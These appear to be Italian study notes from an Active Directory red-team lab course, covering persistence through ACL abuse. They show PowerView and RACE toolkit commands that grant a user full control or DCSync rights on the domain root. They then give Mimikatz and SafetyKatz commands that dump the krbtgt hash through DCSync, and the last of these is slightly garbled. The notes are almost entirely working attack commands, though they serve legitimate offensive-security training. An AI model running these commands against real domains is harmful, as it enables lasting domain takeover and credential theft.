# Persistence using ACLs - Rights Abuse

* Ci sono ACLs molto piu' interessati da abusare rispetto a quelle descritte precedentemente
* Per esempio, avendo privilegi DA, l'ACL per la root domain puo' essere modificata per fornire permessi utili come Full Controll o l'abilita' di eseguire DCSync

#### Full Control Rights

* Using PowerView

```powershell
Add-DomainObjectAcl -TargetIdentity
'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity
student1 -Rights All -PrincipalDomain
dollarcorp.moneycorp.local -TargetDomain
dollarcorp.moneycorp.local -Verbose
```

* Using Active Directory module e RACE toolkit

```powershell
Set-ADACL -SamAccountName studentuser1 -
DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local'
-Right GenericAll -Verbose
```

#### Aggiungere permessi per DCSync

* Utilzzando PoweView

```powershell
Add-DomainObjectAcl -TargetIdentity
'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity
student1 -Rights DCSync -PrincipalDomain
dollarcorp.moneycorp.local -TargetDomain
dollarcorp.moneycorp.local -Verbose
```

* Utilizzando ActiveDirectory module e RACE toolkit

```powershell
Set-ADACL -SamAccountName studentuser1 -DistinguishedName
'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -
Verbose
```

#### Execute DCSync

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

oppure

```powershell
C:\AD\Tools\SafetyKatz.exe  /user:dcorp\krbtgt" "exit" "lsadump::dcsync
AlteredSecurity
```
